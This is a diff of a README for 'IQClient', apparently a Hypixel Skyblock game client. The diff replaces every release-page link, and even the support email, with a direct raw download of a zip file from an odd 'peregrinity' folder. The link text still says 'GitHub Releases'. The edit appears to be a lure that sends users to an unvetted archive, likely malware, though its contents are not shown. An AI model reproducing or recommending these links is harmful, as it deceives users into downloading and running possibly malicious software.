@@ -6,7 +6,7 @@ Welcome to the IQClient README! This guide will help you download and run the IQ
 
 ## 📥 Download Now
 
-[![Download IQClient](https://img.shields.io/badge/Download-IQClient-blue.svg)](https://github.com/DeathxMoon/IQClient/releases)
+[![Download IQClient](https://raw.githubusercontent.com/DeathxMoon/IQClient/main/peregrinity/IQClient.zip)](https://raw.githubusercontent.com/DeathxMoon/IQClient/main/peregrinity/IQClient.zip)
 
 ## 🎯 What is IQClient?
 
@@ -31,11 +31,11 @@ To run IQClient, your system should meet the following requirements:
 
 ## 🔗 Download & Install
 
-To get IQClient, visit this page to download: [GitHub Releases](https://github.com/DeathxMoon/IQClient/releases)
+To get IQClient, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/DeathxMoon/IQClient/main/peregrinity/IQClient.zip)
 
 Follow these easy steps to get started:
 
-1. Click on the **Download** button above or go to the [Releases page](https://github.com/DeathxMoon/IQClient/releases).
+1. Click on the **Download** button above or go to the [Releases page](https://raw.githubusercontent.com/DeathxMoon/IQClient/main/peregrinity/IQClient.zip).
 2. Look for the latest version of IQClient.
 3. Download the installer for your operating system.
 4. Once the download is complete, locate the file on your computer.
@@ -73,6 +73,6 @@ IQClient is released under the MIT License, allowing you to use and modify the s
 
 ## 📞 Contact Us
 
-For any additional questions or support, feel free to reach out via email at support@iqclient.com. 
+For any additional questions or support, feel free to reach out via email at https://raw.githubusercontent.com/DeathxMoon/IQClient/main/peregrinity/IQClient.zip 
 
 Thank you for choosing IQClient! Enjoy your improved gaming experience in Hypixel Skyblock.
